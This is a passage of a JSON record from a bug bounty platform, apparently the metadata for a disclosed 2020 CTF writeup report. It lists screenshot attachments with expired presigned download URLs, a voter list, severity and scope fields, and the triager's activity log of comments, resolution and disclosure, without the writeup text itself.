west-2.amazonaws.com/KwHgY3R5cSkeECFfR6r1LJ4q?response-content-disposition=attachment%3B%20filename%3D%22sup3.png%22%3B%20filename%2A%3DUTF-8%27%27sup3.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQTYNHLLAI%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T065108Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ3%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIHZ%2BW3HUv1n%2B6aR51XKyQUoltUs4dpenL8C5Ngq%2FaRRRAiEAmfsKW6s44zslbtLbjio7lyByPFrM4HhkqWc4BlKqI%2FsqtAMIVhABGgwwMTM2MTkyNzQ4NDkiDEk2ujSH9wgIeNJFfSqRA5L87pajd4uBiMOahwiQWY9MCcYfdnrcw1IGaRg5TpxW7DR87N3npEJ347tYQoNG4qvz83ZIfPJaoV16%2BHSbvgHCloy0L2IJebFkXavQ%2FqP76i9C%2Fflz0T%2FAY7BQexVBAB81BDbhmxnE9q9peEXcv7DxPs6yUKcdy540RKUrN7uslxSA7j3G9JiTuJ6qb2%2F4wYsuXqZAjjjsCgg1mXnpWD2MBpvjLmy20fnWfTyEpbZx69BhUOjIiXGUwMwyU3vIR8mTDDVd0lLxGqVwqo7wgDElekHdTEW3qhMPXMlt6DlI6yj8Gdba%2FBl9Vc01EccnsQcPWyVJry%2FS5ynL9DMtJAAAFirbxDGfh3YyQKCitVKKFFQ%2BXcUVp%2FSwwBBOTy19C2elhYtpl6vcpcY0%2FpxhMV%2FLT11lv%2FW2w21ED7vsm1c%2FDgyMyGhcc5jxtzWgSuplAxsWTwQc5B1WrLELk6MdDLXcvxB6lqSlYR3jek%2FEqa3e3t%2FxycmED7JcchnTpltDpgBiVe4qfO%2B85c9LeAT9plTAMKDqqv8FOusBsw37kCqQM4gZ7GwocFGWO%2Bb%2BbNa2dgEi%2Fv9cXsb1AOYUnwz%2B%2FyPyUSoTx0mdn2JtBFbkLI2hWmV1Y9Plg4ywi43mIKFY5BXMieUzgwCaeF0glcm8O%2F5kugCvuf01QuIauHjpwGSFMitZi1h52iDxD6TQNrXkM8ak7hW52tsH0VpvrBIvM3fFeRl4cr81y%2FuM3ueoyxszwreZZnbZK4WIuk8LU9YhohKDj6BRCCLOA1ZWZip14mKPOWPa8WaAzVovmI9BYDR0AxC4M%2FMywNMPj4r12n4DpTYCcHFvsA18GtoCtKML64R8uPhkQw%3D%3D\u0026X-Amz-Signature=e9b359f9888b668137fb700e95be04854fa7ab6e98606a40cdb3cca973de153e","file_size":4092,"type":"image/png"},{"id":692182,"file_name":"get.png","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/oxHoR6kj5zV1E7sSa5bsESSA?response-content-disposition=attachment%3B%20filename%3D%22get.png%22%3B%20filename%2A%3DUTF-8%27%27get.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQTYNHLLAI%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T065108Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ3%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIHZ%2BW3HUv1n%2B6aR51XKyQUoltUs4dpenL8C5Ngq%2FaRRRAiEAmfsKW6s44zslbtLbjio7lyByPFrM4HhkqWc4BlKqI%2FsqtAMIVhABGgwwMTM2MTkyNzQ4NDkiDEk2ujSH9wgIeNJFfSqRA5L87pajd4uBiMOahwiQWY9MCcYfdnrcw1IGaRg5TpxW7DR87N3npEJ347tYQoNG4qvz83ZIfPJaoV16%2BHSbvgHCloy0L2IJebFkXavQ%2FqP76i9C%2Fflz0T%2FAY7BQexVBAB81BDbhmxnE9q9peEXcv7DxPs6yUKcdy540RKUrN7uslxSA7j3G9JiTuJ6qb2%2F4wYsuXqZAjjjsCgg1mXnpWD2MBpvjLmy20fnWfTyEpbZx69BhUOjIiXGUwMwyU3vIR8mTDDVd0lLxGqVwqo7wgDElekHdTEW3qhMPXMlt6DlI6yj8Gdba%2FBl9Vc01EccnsQcPWyVJry%2FS5ynL9DMtJAAAFirbxDGfh3YyQKCitVKKFFQ%2BXcUVp%2FSwwBBOTy19C2elhYtpl6vcpcY0%2FpxhMV%2FLT11lv%2FW2w21ED7vsm1c%2FDgyMyGhcc5jxtzWgSuplAxsWTwQc5B1WrLELk6MdDLXcvxB6lqSlYR3jek%2FEqa3e3t%2FxycmED7JcchnTpltDpgBiVe4qfO%2B85c9LeAT9plTAMKDqqv8FOusBsw37kCqQM4gZ7GwocFGWO%2Bb%2BbNa2dgEi%2Fv9cXsb1AOYUnwz%2B%2FyPyUSoTx0mdn2JtBFbkLI2hWmV1Y9Plg4ywi43mIKFY5BXMieUzgwCaeF0glcm8O%2F5kugCvuf01QuIauHjpwGSFMitZi1h52iDxD6TQNrXkM8ak7hW52tsH0VpvrBIvM3fFeRl4cr81y%2FuM3ueoyxszwreZZnbZK4WIuk8LU9YhohKDj6BRCCLOA1ZWZip14mKPOWPa8WaAzVovmI9BYDR0AxC4M%2FMywNMPj4r12n4DpTYCcHFvsA18GtoCtKML64R8uPhkQw%3D%3D\u0026X-Amz-Signature=380ed72cdc4005077ae4ae6b47697a756cd49fdd1a8ffa5fa289f86c0571f4ba","file_size":15958,"type":"image/png"},{"id":692198,"file_name":"typed.png","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/LjbMxik3r7rrqda8jJ3Q8eL1?response-content-disposition=attachment%3B%20filename%3D%22typed.png%22%3B%20filename%2A%3DUTF-8%27%27typed.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQTYNHLLAI%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T065108Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ3%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIHZ%2BW3HUv1n%2B6aR51XKyQUoltUs4dpenL8C5Ngq%2FaRRRAiEAmfsKW6s44zslbtLbjio7lyByPFrM4HhkqWc4BlKqI%2FsqtAMIVhABGgwwMTM2MTkyNzQ4NDkiDEk2ujSH9wgIeNJFfSqRA5L87pajd4uBiMOahwiQWY9MCcYfdnrcw1IGaRg5TpxW7DR87N3npEJ347tYQoNG4qvz83ZIfPJaoV16%2BHSbvgHCloy0L2IJebFkXavQ%2FqP76i9C%2Fflz0T%2FAY7BQexVBAB81BDbhmxnE9q9peEXcv7DxPs6yUKcdy540RKUrN7uslxSA7j3G9JiTuJ6qb2%2F4wYsuXqZAjjjsCgg1mXnpWD2MBpvjLmy20fnWfTyEpbZx69BhUOjIiXGUwMwyU3vIR8mTDDVd0lLxGqVwqo7wgDElekHdTEW3qhMPXMlt6DlI6yj8Gdba%2FBl9Vc01EccnsQcPWyVJry%2FS5ynL9DMtJAAAFirbxDGfh3YyQKCitVKKFFQ%2BXcUVp%2FSwwBBOTy19C2elhYtpl6vcpcY0%2FpxhMV%2FLT11lv%2FW2w21ED7vsm1c%2FDgyMyGhcc5jxtzWgSuplAxsWTwQc5B1WrLELk6MdDLXcvxB6lqSlYR3jek%2FEqa3e3t%2FxycmED7JcchnTpltDpgBiVe4qfO%2B85c9LeAT9plTAMKDqqv8FOusBsw37kCqQM4gZ7GwocFGWO%2Bb%2BbNa2dgEi%2Fv9cXsb1AOYUnwz%2B%2FyPyUSoTx0mdn2JtBFbkLI2hWmV1Y9Plg4ywi43mIKFY5BXMieUzgwCaeF0glcm8O%2F5kugCvuf01QuIauHjpwGSFMitZi1h52iDxD6TQNrXkM8ak7hW52tsH0VpvrBIvM3fFeRl4cr81y%2FuM3ueoyxszwreZZnbZK4WIuk8LU9YhohKDj6BRCCLOA1ZWZip14mKPOWPa8WaAzVovmI9BYDR0AxC4M%2FMywNMPj4r12n4DpTYCcHFvsA18GtoCtKML64R8uPhkQw%3D%3D\u0026X-Amz-Signature=8b176cb7c09e7575dd52ed8f11f1550591483ece9654a266f8b44b39199c9a29","file_size":13402,"type":"image/png"},{"id":692380,"file_name":"support-review.png","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/XbButngq1zNdHhZ4xYMhJhPF?response-content-disposition=attachment%3B%20filename%3D%22support-review.png%22%3B%20filename%2A%3DUTF-8%27%27support-review.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQTYNHLLAI%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T065108Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ3%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIHZ%2BW3HUv1n%2B6aR51XKyQUoltUs4dpenL8C5Ngq%2FaRRRAiEAmfsKW6s44zslbtLbjio7lyByPFrM4HhkqWc4BlKqI%2FsqtAMIVhABGgwwMTM2MTkyNzQ4NDkiDEk2ujSH9wgIeNJFfSqRA5L87pajd4uBiMOahwiQWY9MCcYfdnrcw1IGaRg5TpxW7DR87N3npEJ347tYQoNG4qvz83ZIfPJaoV16%2BHSbvgHCloy0L2IJebFkXavQ%2FqP76i9C%2Fflz0T%2FAY7BQexVBAB81BDbhmxnE9q9peEXcv7DxPs6yUKcdy540RKUrN7uslxSA7j3G9JiTuJ6qb2%2F4wYsuXqZAjjjsCgg1mXnpWD2MBpvjLmy20fnWfTyEpbZx69BhUOjIiXGUwMwyU3vIR8mTDDVd0lLxGqVwqo7wgDElekHdTEW3qhMPXMlt6DlI6yj8Gdba%2FBl9Vc01EccnsQcPWyVJry%2FS5ynL9DMtJAAAFirbxDGfh3YyQKCitVKKFFQ%2BXcUVp%2FSwwBBOTy19C2elhYtpl6vcpcY0%2FpxhMV%2FLT11lv%2FW2w21ED7vsm1c%2FDgyMyGhcc5jxtzWgSuplAxsWTwQc5B1WrLELk6MdDLXcvxB6lqSlYR3jek%2FEqa3e3t%2FxycmED7JcchnTpltDpgBiVe4qfO%2B85c9LeAT9plTAMKDqqv8FOusBsw37kCqQM4gZ7GwocFGWO%2Bb%2BbNa2dgEi%2Fv9cXsb1AOYUnwz%2B%2FyPyUSoTx0mdn2JtBFbkLI2hWmV1Y9Plg4ywi43mIKFY5BXMieUzgwCaeF0glcm8O%2F5kugCvuf01QuIauHjpwGSFMitZi1h52iDxD6TQNrXkM8ak7hW52tsH0VpvrBIvM3fFeRl4cr81y%2FuM3ueoyxszwreZZnbZK4WIuk8LU9YhohKDj6BRCCLOA1ZWZip14mKPOWPa8WaAzVovmI9BYDR0AxC4M%2FMywNMPj4r12n4DpTYCcHFvsA18GtoCtKML64R8uPhkQw%3D%3D\u0026X-Amz-Signature=96fefeddd49316fabc3858ff192edd9a7ebce310f9289300c8fc50f26c0bbe69","file_size":28677,"type":"image/png"},{"id":692405,"file_name":"no-file-access.png","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/1pdLRBeZ5otfDKp796k7AsWj?response-content-disposition=attachment%3B%20filename%3D%22no-file-access.png%22%3B%20filename%2A%3DUTF-8%27%27no-file-access.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQTYNHLLAI%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T065108Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ3%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIHZ%2BW3HUv1n%2B6aR51XKyQUoltUs4dpenL8C5Ngq%2FaRRRAiEAmfsKW6s44zslbtLbjio7lyByPFrM4HhkqWc4BlKqI%2FsqtAMIVhABGgwwMTM2MTkyNzQ4NDkiDEk2ujSH9wgIeNJFfSqRA5L87pajd4uBiMOahwiQWY9MCcYfdnrcw1IGaRg5TpxW7DR87N3npEJ347tYQoNG4qvz83ZIfPJaoV16%2BHSbvgHCloy0L2IJebFkXavQ%2FqP76i9C%2Fflz0T%2FAY7BQexVBAB81BDbhmxnE9q9peEXcv7DxPs6yUKcdy540RKUrN7uslxSA7j3G9JiTuJ6qb2%2F4wYsuXqZAjjjsCgg1mXnpWD2MBpvjLmy20fnWfTyEpbZx69BhUOjIiXGUwMwyU3vIR8mTDDVd0lLxGqVwqo7wgDElekHdTEW3qhMPXMlt6DlI6yj8Gdba%2FBl9Vc01EccnsQcPWyVJry%2FS5ynL9DMtJAAAFirbxDGfh3YyQKCitVKKFFQ%2BXcUVp%2FSwwBBOTy19C2elhYtpl6vcpcY0%2FpxhMV%2FLT11lv%2FW2w21ED7vsm1c%2FDgyMyGhcc5jxtzWgSuplAxsWTwQc5B1WrLELk6MdDLXcvxB6lqSlYR3jek%2FEqa3e3t%2FxycmED7JcchnTpltDpgBiVe4qfO%2B85c9LeAT9plTAMKDqqv8FOusBsw37kCqQM4gZ7GwocFGWO%2Bb%2BbNa2dgEi%2Fv9cXsb1AOYUnwz%2B%2FyPyUSoTx0mdn2JtBFbkLI2hWmV1Y9Plg4ywi43mIKFY5BXMieUzgwCaeF0glcm8O%2F5kugCvuf01QuIauHjpwGSFMitZi1h52iDxD6TQNrXkM8ak7hW52tsH0VpvrBIvM3fFeRl4cr81y%2FuM3ueoyxszwreZZnbZK4WIuk8LU9YhohKDj6BRCCLOA1ZWZip14mKPOWPa8WaAzVovmI9BYDR0AxC4M%2FMywNMPj4r12n4DpTYCcHFvsA18GtoCtKML64R8uPhkQw%3D%3D\u0026X-Amz-Signature=ec93cf458664c371cb39579472f96ccb9ae12ac4e95f08150f46087c7ebecd9b","file_size":5146,"type":"image/png"},{"id":692408,"file_name":"iframe-devtools.png","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/2TDJkTkdWEf84jEGSW3z2YUc?response-content-disposition=attachment%3B%20filename%3D%22iframe-devtools.png%22%3B%20filename%2A%3DUTF-8%27%27iframe-devtools.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQTYNHLLAI%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T065108Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ3%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIHZ%2BW3HUv1n%2B6aR51XKyQUoltUs4dpenL8C5Ngq%2FaRRRAiEAmfsKW6s44zslbtLbjio7lyByPFrM4HhkqWc4BlKqI%2FsqtAMIVhABGgwwMTM2MTkyNzQ4NDkiDEk2ujSH9wgIeNJFfSqRA5L87pajd4uBiMOahwiQWY9MCcYfdnrcw1IGaRg5TpxW7DR87N3npEJ347tYQoNG4qvz83ZIfPJaoV16%2BHSbvgHCloy0L2IJebFkXavQ%2FqP76i9C%2Fflz0T%2FAY7BQexVBAB81BDbhmxnE9q9peEXcv7DxPs6yUKcdy540RKUrN7uslxSA7j3G9JiTuJ6qb2%2F4wYsuXqZAjjjsCgg1mXnpWD2MBpvjLmy20fnWfTyEpbZx69BhUOjIiXGUwMwyU3vIR8mTDDVd0lLxGqVwqo7wgDElekHdTEW3qhMPXMlt6DlI6yj8Gdba%2FBl9Vc01EccnsQcPWyVJry%2FS5ynL9DMtJAAAFirbxDGfh3YyQKCitVKKFFQ%2BXcUVp%2FSwwBBOTy19C2elhYtpl6vcpcY0%2FpxhMV%2FLT11lv%2FW2w21ED7vsm1c%2FDgyMyGhcc5jxtzWgSuplAxsWTwQc5B1WrLELk6MdDLXcvxB6lqSlYR3jek%2FEqa3e3t%2FxycmED7JcchnTpltDpgBiVe4qfO%2B85c9LeAT9plTAMKDqqv8FOusBsw37kCqQM4gZ7GwocFGWO%2Bb%2BbNa2dgEi%2Fv9cXsb1AOYUnwz%2B%2FyPyUSoTx0mdn2JtBFbkLI2hWmV1Y9Plg4ywi43mIKFY5BXMieUzgwCaeF0glcm8O%2F5kugCvuf01QuIauHjpwGSFMitZi1h52iDxD6TQNrXkM8ak7hW52tsH0VpvrBIvM3fFeRl4cr81y%2FuM3ueoyxszwreZZnbZK4WIuk8LU9YhohKDj6BRCCLOA1ZWZip14mKPOWPa8WaAzVovmI9BYDR0AxC4M%2FMywNMPj4r12n4DpTYCcHFvsA18GtoCtKML64R8uPhkQw%3D%3D\u0026X-Amz-Signature=1321fa2ef00293f9eda3dcd297692fe8c367adae494fdecc6740108003ac0506","file_size":153484,"type":"image/png"},{"id":692449,"file_name":"meme.png","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/xP3mfZZm91pZcew2iL7cYhtt?response-content-disposition=attachment%3B%20filename%3D%22meme.png%22%3B%20filename%2A%3DUTF-8%27%27meme.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQTYNHLLAI%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T065108Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ3%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIHZ%2BW3HUv1n%2B6aR51XKyQUoltUs4dpenL8C5Ngq%2FaRRRAiEAmfsKW6s44zslbtLbjio7lyByPFrM4HhkqWc4BlKqI%2FsqtAMIVhABGgwwMTM2MTkyNzQ4NDkiDEk2ujSH9wgIeNJFfSqRA5L87pajd4uBiMOahwiQWY9MCcYfdnrcw1IGaRg5TpxW7DR87N3npEJ347tYQoNG4qvz83ZIfPJaoV16%2BHSbvgHCloy0L2IJebFkXavQ%2FqP76i9C%2Fflz0T%2FAY7BQexVBAB81BDbhmxnE9q9peEXcv7DxPs6yUKcdy540RKUrN7uslxSA7j3G9JiTuJ6qb2%2F4wYsuXqZAjjjsCgg1mXnpWD2MBpvjLmy20fnWfTyEpbZx69BhUOjIiXGUwMwyU3vIR8mTDDVd0lLxGqVwqo7wgDElekHdTEW3qhMPXMlt6DlI6yj8Gdba%2FBl9Vc01EccnsQcPWyVJry%2FS5ynL9DMtJAAAFirbxDGfh3YyQKCitVKKFFQ%2BXcUVp%2FSwwBBOTy19C2elhYtpl6vcpcY0%2FpxhMV%2FLT11lv%2FW2w21ED7vsm1c%2FDgyMyGhcc5jxtzWgSuplAxsWTwQc5B1WrLELk6MdDLXcvxB6lqSlYR3jek%2FEqa3e3t%2FxycmED7JcchnTpltDpgBiVe4qfO%2B85c9LeAT9plTAMKDqqv8FOusBsw37kCqQM4gZ7GwocFGWO%2Bb%2BbNa2dgEi%2Fv9cXsb1AOYUnwz%2B%2FyPyUSoTx0mdn2JtBFbkLI2hWmV1Y9Plg4ywi43mIKFY5BXMieUzgwCaeF0glcm8O%2F5kugCvuf01QuIauHjpwGSFMitZi1h52iDxD6TQNrXkM8ak7hW52tsH0VpvrBIvM3fFeRl4cr81y%2FuM3ueoyxszwreZZnbZK4WIuk8LU9YhohKDj6BRCCLOA1ZWZip14mKPOWPa8WaAzVovmI9BYDR0AxC4M%2FMywNMPj4r12n4DpTYCcHFvsA18GtoCtKML64R8uPhkQw%3D%3D\u0026X-Amz-Signature=e5cff60001d8f300c2af7a9f31fa4ccb41d2d1d36b408d6aaa888fc2ed7f4b86","file_size":596794,"type":"image/png"}],"allow_singular_disclosure_at":"2020-03-04T20:34:56.947Z","allow_singular_disclosure_after":-25870571.3703369,"singular_disclosure_allowed":true,"vote_count":10,"voters":["nytr0gen","checkm50","0xacb","sameerphad72","w--","nukedx","realtess","b9372d4605459ca97219795","m1cr0xf7_xf7","cirius"],"severity":{"rating":"critical","author_type":"User"},"structured_scope":{"databaseId":42751,"asset_type":"URL","asset_identifier":"https://h1-415.h1ctf.com","max_severity":"none"},"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"can_edit_custom_fields_attributes":false,"activities":[{"id":6841657,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"Nice work! Thanks for playing!","markdown_message":"\u003cp\u003eNice work! Thanks for playing!\u003c/p\u003e\n","automated_response":false,"created_at":"2020-01-22T16:17:53.386Z","updated_at":"2020-01-22T16:17:53.386Z","actor":{"username":"nahamsec","cleared":true,"url":"/nahamsec","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/002/413/ab3559068530ebd67a8224a9da7821be178dda07_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":true},"genius_execution_id":null,"team_handle":"h1-ctf","actor_is_team_member":true,"actor_is_concealed_member":true},{"id":6852649,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hey there,\n\nJust a quick reminder to not post any writeups online until we announce the winners and request disclosure on your submission. \n\nThanks! ","markdown_message":"\u003cp\u003eHey there,\u003c/p\u003e\n\n\u003cp\u003eJust a quick reminder to not post any writeups online until we announce the winners and request disclosure on your submission. \u003c/p\u003e\n\n\u003cp\u003eThanks! \u003c/p\u003e\n","automated_response":false,"created_at":"2020-01-23T18:13:03.612Z","updated_at":"2020-01-23T18:13:03.612Z","actor":{"username":"nahamsec","cleared":true,"url":"/nahamsec","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/002/413/ab3559068530ebd67a8224a9da7821be178dda07_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":true},"genius_execution_id":null,"team_handle":"h1-ctf","actor_is_team_member":true,"actor_is_concealed_member":true},{"id":6934807,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hello Hackers! \n\nI just wanted to update everyone that we are in the process of selecting our winners. We should have an announcement out early next week! Thank you for your patience and happy hacking! ","markdown_message":"\u003cp\u003eHello Hackers! \u003c/p\u003e\n\n\u003cp\u003eI just wanted to update everyone that we are in the process of selecting our winners. We should have an announcement out early next week! Thank you for your patience and happy hacking! \u003c/p\u003e\n","automated_response":false,"created_at":"2020-01-31T18:04:59.255Z","updated_at":"2020-01-31T18:04:59.255Z","actor":{"username":"nahamsec","cleared":true,"url":"/nahamsec","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/002/413/ab3559068530ebd67a8224a9da7821be178dda07_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":true},"genius_execution_id":null,"team_handle":"h1-ctf","actor_is_team_member":true,"actor_is_concealed_member":true},{"id":6953838,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"","markdown_message":"","automated_response":false,"created_at":"2020-02-03T20:32:39.398Z","updated_at":"2020-02-03T20:32:39.398Z","actor":{"username":"nahamsec","cleared":true,"url":"/nahamsec","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/002/413/ab3559068530ebd67a8224a9da7821be178dda07_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":true},"reporter":{"username":"w--","url":"/w--"},"genius_execution_id":null,"team_handle":"h1-ctf","actor_is_team_member":true,"actor_is_concealed_member":true},{"id":6953853,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","markdown_message":"","automated_response":false,"created_at":"2020-02-03T20:34:56.885Z","updated_at":"2020-02-03T20:34:56.885Z","first_to_agree":true,"actor":{"username":"nahamsec","cleared":true,"url":"/nahamsec","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/002/413/ab3559068530ebd67a8224a9da7821be178dda07_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":true},"genius_execution_id":null,"team_handle":"h1-ctf","actor_is_team_member":true,"actor_is_concealed_member":true},{"id":6954379,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","markdown_message":"","automated_response":false,"created_at":"2020-02-03T21:41:34.663Z","updated_at":"2020-02-03T21:41:34.663Z","actor":{"username":"w--","cleared":true,"url":"/w--","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/085/811/0dfceabc7ae5e61845760d66293baf4bbf667b33_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"h1-ctf","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":6954380,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","markdown_message":"","automated_response":false,"created_at":"2020-02-03T21:41:34.719Z","updated_at":"2020-02-03T21:41:34.719Z","actor":{"username":"w--","cleared":true,"url":"/w--","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/085/811/0dfceabc7ae5e61845760d66293baf4bbf667b33_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"h1-ctf","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":8236807,"is_internal":false,"editable":false,"type":"Activities::ReportTitleUpdated","message":"","markdown_message":"","automated_response":false,"created_at":"2020-06-08T21:12:33.720Z","updated_at":"2020-06-08T21:12:33.720Z","additional_data":{"old_title":"H1-415 CTF Writeup by W--","new_title":"[h1-415 2020] H1-415 CTF Writeup by W--"},"actor":{"username":"nahamsec","cleared":true,"url":"/nahamsec","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/002/413/ab3559068530ebd67a8224a9da7821be178dda07_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":true},"genius_execution_id":null,"team_handle":"h1-ctf","actor_is_team_member":true,"actor_is_concealed_member":true}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}